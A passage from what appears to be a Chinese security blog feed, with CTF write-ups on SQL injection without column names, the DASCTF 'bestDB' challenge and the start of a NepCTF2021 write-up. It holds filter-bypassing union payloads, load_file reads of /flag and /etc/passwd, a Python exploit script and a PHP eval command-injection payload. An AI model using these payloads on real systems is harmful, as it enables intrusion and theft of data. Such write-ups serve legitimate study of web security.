<span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195833956.png" class="" title="union" loading="lazy"><p>å¦‚å›¾æ‰€ç¤ºï¼Œåˆ—åè¢«æ›¿æ¢æˆäº†æ•°å­—ï¼Œ</p><table><thead><tr><th>1ï¼ˆæ´¾ç”Ÿè¡¨åˆ—1ï¼‰</th><th>2ï¼ˆæ´¾ç”Ÿè¡¨åˆ—2ï¼‰</th><th>3ï¼ˆæ´¾ç”Ÿè¡¨åˆ—3ï¼‰</th><th>4ï¼ˆæ´¾ç”Ÿè¡¨åˆ—4ï¼‰</th><th>5ï¼ˆæ´¾ç”Ÿè¡¨åˆ—5ï¼‰</th></tr></thead><tbody><tr><td>1ï¼ˆåŸidï¼‰</td><td>2ï¼ˆåŸusernameï¼‰</td><td>3ï¼ˆåŸpasswordï¼‰</td><td>4ï¼ˆåŸquestionï¼‰</td><td>5ï¼ˆåŸtokenï¼‰</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥ç”¨æ•°å­—æ¥å¯¹åº”åˆ—æŸ¥è¯¢</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span><span class="token number">2</span><span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329200819627.png" class="" title="union2" loading="lazy"><p>å¦‚æœåå¼•å·è¢«è¿‡æ»¤ï¼ŒåŒæ ·ç»§ç»­ç”¨åˆ«åä»£æ›¿</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> c <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">as</span> c<span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">as</span> d <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329201418814.png" class="" title="åˆ«å" loading="lazy"><p>æ­¤æ—¶æ´¾ç”Ÿè¡¨å¦‚ä¸‹</p><table><thead><tr><th>1ï¼ˆæ´¾ç”Ÿè¡¨åˆ—1ï¼‰</th><th>bï¼ˆåŸæ´¾ç”Ÿè¡¨åˆ—2ï¼‰</th><th>3ï¼ˆæ´¾ç”Ÿè¡¨åˆ—3ï¼‰</th><th>cï¼ˆåŸæ´¾ç”Ÿè¡¨åˆ—4ï¼‰</th><th>dï¼ˆæ´¾ç”Ÿè¡¨åˆ—5ï¼‰</th></tr></thead><tbody><tr><td>1ï¼ˆåŸidï¼‰</td><td>2ï¼ˆåŸusernameï¼‰</td><td>3ï¼ˆåŸpasswordï¼‰</td><td>4ï¼ˆåŸquestionï¼‰</td><td>5ï¼ˆåŸtokenï¼‰</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>åŒæ—¶æŸ¥è¯¢å¤šä¸ªåˆ—</p><pre class="language-none"><code class="language-none">select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from &#96;table&#96;)a;</code></pre><p><code>0x2d</code>ä¸º<code>-</code></p><img src="/article/mardasctf/image-20210329202408382.png" class="" title="concat" loading="lazy"><hr><p>ä»¥ä¸‹æ˜¯æ¯”èµ›WP</p><h3 id="DASCTFä¸‰æœˆèµ›Â·bestDB"><a href="#DASCTFä¸‰æœˆèµ›Â·bestDB" class="headerlink" title="DASCTFä¸‰æœˆèµ›Â·bestDB"></a>DASCTFä¸‰æœˆèµ›Â·bestDB</h3><blockquote><p>ç”±äºç”µè„‘å´©äº†:(  bpå’Œç½‘é¡µéƒ½æ²¡äº†ï¼Œåªèƒ½å‡­æˆ‘å†™äº†</p></blockquote><p>è¿›å»ä¸€ä¸ªæŸ¥è¯¢æ¡†ï¼Œé¢˜ç›®åå­—æœ‰dbï¼Œè‚¯å®šæ˜¯æ³¨å…¥äº†ã€‚</p><p>æ³¨é‡Šä¸­å‘ç°hint</p><pre class="language-html" data-language="html"><code class="language-html">&lt;!-- SELECT * FROM users WHERE id = '$query' OR username = \"$query\" --!></code></pre><p>è¿™å°±å»ºä¸ªæ•°æ®åº“æµ‹è¯•ï¼Œç»æµ‹è¯•å‘ç°banäº†ç©ºæ ¼å’Œå•å¼•å·ï¼Œæµ‹è¯•å‡ºäº†payload</p><p><code>-1&quot;union/**/select/**/1,2,3&quot;</code></p><img src="/article/mardasctf/image-20210329193545757.png" class="" title="union" loading="lazy"><p>å›æ˜¾ä½ä¸º1å’Œ2ï¼Œæ”¹æ”¹ä»¥å‰çš„è„šæœ¬ï¼ŒæŸ¥æ•°æ®åº“å</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,database(),3"</span><span class="token comment"># databases==========>users</span></code></pre><p>æŸ¥è¡¨å</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3"</span><span class="token comment"># tables==========>f1agdas,users</span></code></pre><p>æ— åˆ—åæŸ¥è¯¢(å…¶å®ç›´æ¥æŸ¥å°±å¥½ï¼Œæœ¬äººå¤ä¹ ä¸€ä¸‹ä¹‹å‰çš„çŸ¥è¯†)</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/f1agdas/**/limit/**/1,1)a),3"</span><span class="token comment"># data==========>flag.txt</span></code></pre><hr><p>æŸ¥åˆ°<code>f1agdas</code>è¡¨é‡Œæœ‰ä¸ª<code>flag.txt</code>ï¼Œåº”è¯¥æ˜¯åˆ©ç”¨<code>load_file()</code>å‡½æ•°è¯»å–æ–‡ä»¶ï¼ŒæŸ¥äº†ä¸‹ç”¨æˆ·</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,user(),3"</span><span class="token comment"># user==========>'root'@'localhost'</span></code></pre><p>è‚¯å®šæœ‰æƒé™äº†ï¼Œè¯»äº†<code>index.php</code>å’Œ<code>dbConnect.php</code>ï¼Œç»™å¤ç°çš„å¸ˆå‚…å‚è€ƒ</p><pre class="language-php" data-language="php"><code class="language-php">// index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token single-quoted-string string">'dbConnect.php'</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'delete'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'drop'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'update'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token variable">$item</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Forbidden!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT * FROM users WHERE id = '<span class="token interpolation"><span class="token variable">$query</span></span>' OR username = \"<span class="token interpolation"><span class="token variable">$query</span></span>\""</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>&lt;tr>&lt;th>ID&lt;/th>&lt;th>UserName&lt;/th>&lt;/tr>"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;tr>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;/tr>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/table>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">// dbConnect.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$serve</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'users'</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mysqli</span><span class="token punctuation">(</span><span class="token variable">$serve</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'connect error:'</span><span class="token punctuation">.</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set_charset</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è®¾ç½®æ•°æ®åº“å­—ç¬¦é›†</span></span></code></pre><p>è¯»å–æ ¹ç›®å½•ä¸‹flagï¼Œç”±äºbanäº†<code>flag</code>ï¼Œè½¬åå…­è¿›åˆ¶å³å¯</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,hex(load_file(0x2f666c6167)),3"</span></code></pre><p><code>hex(&#39;/flag&#39;)==&#39;0x2f666c6167&#39;</code></p><p>ç»“æŸäº†</p><p>é™„ä¸Šå°è„šæœ¬ï¼Œè™½ç„¶æ²¡å•¥ç”¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3æœˆ 27, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://ea4d13de-db0a-41e5-b303-a843bd51a27b.machine.dasctf.com/?query="</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Forbidden"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Forbidden"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"right"</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,database(),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># databases==========>users</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select group_concat(table_name) from information_schema.tables where table_schema like database()),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># tables==========>f1agdas,users</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select `2` from (select 1,2 union select * from f1agdas limit 1,1)a),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># flag.columns==========>flag.txt</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,hex(load_file(0x2f666c6167)),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># database()</span>    <span class="token comment"># table()</span>    <span class="token comment"># columns()</span>    data<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><p>ä»¥ä¸‹æ˜¯æœ¬äººçš„ç¢ç¢å¿µå’Œåæ€ï¼Œå¸ˆå‚…ä»¬å¯ä»¥è·³è¿‡æƒ¹</p><p>ç»éªŒä¸è¶³ï¼Œæœ€åè¿˜æ˜¯æ²¡èƒ½å‡ºè¿™ç®€å•é¢˜ã€‚ä¸€æ–¹é¢ä¹Ÿæ˜¯å¹³å°çš„é—®é¢˜ï¼Œå®åœ¨å¤ªå¡äº†:(</p><p>æ•°æ®åº“é‡Œå†™çš„<code>flag.txt</code>ï¼Œæœ€åå´åœ¨æ ¹ç›®å½•<code>/flag</code>ã€‚å°è¯•è¿‡åå…­è¿›åˆ¶<code>/flag</code>è¯»å–ï¼Œå¯èƒ½æ˜¯å› ä¸ºå¤ªå¡äº†ï¼Œæ²¡æˆåŠŸå°±æ²¡å†è¯•äº†ï¼Œä»¥ä¸ºå°±æ˜¯<code>flag.txt</code>ã€‚ç›²çŒœæœ‰äººæ‹¿åˆ°æ³¨å…¥é¢˜ç›´æ¥sqlmapå¼€å§‹è·‘ï¼ˆå› ä¸ºä¹‹å‰æˆ‘ä¹Ÿå¹²è¿‡ï¼‰ï¼Œå¯¼è‡´æœåŠ¡å™¨è´Ÿè½½å¤ªå¤§ï¼Œæˆ–è€…è¯´è¿ç»´å»ä¸‰äºšäº†2333</p><p>è¿˜å°è¯•äº†è¯»å–ä¸€å †æ— ç”¨çš„ä¸œè¥¿ï¼Œä»¥ä¸ºå’Œ <a href="/article/Buuoj-WEB-Write-up/#Comment">[ç½‘é¼æ¯ 2018]Comment</a> ä¸€æ ·</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># @@datadir</span><span class="token comment"># /var/lib/mysql/</span><span class="token comment"># @@basedir</span><span class="token comment"># /usr/</span><span class="token comment"># /etc/host</span><span class="token comment"># 127.0.0.1localhost</span><span class="token comment"># ::1localhost ip6-localhost ip6-loopback</span><span class="token comment"># fe00::0ip6-localnet</span><span class="token comment"># ff00::0ip6-mcastprefix</span><span class="token comment"># ff02::1ip6-allnodes</span><span class="token comment"># ff02::2ip6-allrouters</span><span class="token comment"># 192.168.0.1149fa7a3d75b4f</span><span class="token comment"># /etc/passwd</span><span class="token comment"># root:x:0:0:root:/root:/bin/bash</span><span class="token comment"># daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><span class="token comment"># bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><span class="token comment"># sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><span class="token comment"># sync:x:4:65534:sync:/bin:/bin/sync</span><span class="token comment"># games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><span class="token comment"># man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><span class="token comment"># lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><span class="token comment"># mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><span class="token comment"># news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><span class="token comment"># uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><span class="token comment"># proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><span class="token comment"># www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><span class="token comment"># backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><span class="token comment"># list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><span class="token comment"># irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><span class="token comment"># gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><span class="token comment"># nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><span class="token comment"># _apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><span class="token comment"># mysql:x:101:101:MySQL Server,,,:/var/lib/mysql/:/bin/false</span></code></pre><p>æ²¡æœ‰çº¿ç´¢ï¼Œç›²çŒœè¯»äº†ä¸ª<code>start.sh</code></p><pre class="language-sh" data-language="sh"><code class="language-sh">#!&#x2F;bin&#x2F;bashrm -rf &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock.lockrm -rf &#x2F;tmp&#x2F;mysql.sockusermod -d &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; mysqlln -s &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock &#x2F;tmp&#x2F;mysql.sockchown -R mysql:mysql &#x2F;var&#x2F;lib&#x2F;mysqlmysqld_safe &amp;mysql_ready() &#123;mysqladmin ping --socket&#x3D;&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock --user&#x3D;root --password&#x3D;root &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1&#125;while !(mysql_ready)doecho &quot;waiting for mysql ...&quot;sleep 3donemysql -e &quot;ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;root&#39;;flush privileges;&quot; -uroot -prootif [[ -f &#x2F;db.sql ]]; then    mysql -e &quot;source &#x2F;db.sql&quot; -uroot -proot    rm -f &#x2F;db.sqlfiif [[ -f &#x2F;flag.sh ]]; thensource &#x2F;flag.shfiapache2-foreground</code></pre><p>ç„¶åå¼€å§‹çˆ†<code>/proc/[id]/fd/[id]</code>ä¸€å»ä¸å¤è¿”äº†ã€‚å¹³å°å¼„å¡ä¹Ÿæœ‰æˆ‘çš„ä¸€ä»½ï½</p><p>ç”šè‡³è¿˜è¯»äº†apacheé…ç½®æ–‡ä»¶ç­‰ç­‰ç­‰ï¼Œå®åœ¨æ˜¯ç»éªŒä¸è¶³ï¼Œè¿˜æ˜¯æœ¬äººå¤ªèœäº†2333</p><p>åšä¸ªåæ€å§ï¼Œä¹Ÿè®¸å“ªå¤©ç¾è€»å¿ƒçˆ†å‘è¿™æ®µå°±ç»™æˆ‘åˆ äº†ã€‚</p><p>å†™ç»™ä»–äººæ˜é‰´ï¼Œå†™ç»™è‡ªå·±åæ€ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;sqlæ³¨å…¥çš„å§¿åŠ¿&lt;/p&gt;</summary>
    
    
    
    <category term="æ‚è°ˆç¬”è®°" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="SQL" scheme="https://err0r.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF2021</title>
    <link href="https://err0r.top/article/Nepctf2021/"/>
    <id>https://err0r.top/article/Nepctf2021/</id>
    <published>2021-03-22T04:59:47.000Z</published>
    <updated>2021-03-30T11:45:53.216Z</updated>
    
    <content type="html"><![CDATA[<p>é˜Ÿä¼åç§°ï¼šErr0r</p><a id="more"></a><p>é˜Ÿä¼æƒ…å†µï¼š</p><img src="/article/Nepctf2021/image-20210322130933265.png" class="" title="rank" loading="lazy"><p>è™½ç„¶å¹³å°å…«å¤ªè¡Œï¼Œä½†æ˜¯éƒ¨åˆ†é¢˜ç›®è´¨é‡å¾ˆé«˜ï¼Œæœ¬èœé¸¡çˆ¬äº†ï¼Œè™šå¿ƒå­¦ä¹ ã€‚</p><p>æœ¬Wpä¾§é‡äºæ€è·¯è®°å½•ï¼Œå¤§ä½¬ä»¬è½»å–·â€¦</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><h4 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>`cat`<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>`<span class="token operator">*</span><span class="token operator">></span>a`<span class="token punctuation">;</span>è®¿é—®<span class="token punctuation">.</span><span class="token operator">/</span>a</code></pre><h4 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h4><p>æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$nep</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'too long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>éå¸¸ç®€æ´ï¼Œä¼ å…¥ä¸¤ä¸ªå‚æ•°ç„¶å<code>eval</code>æ‰§è¡Œï¼Œæ ¼å¼ä¸º</p><pre class="language-none"><code 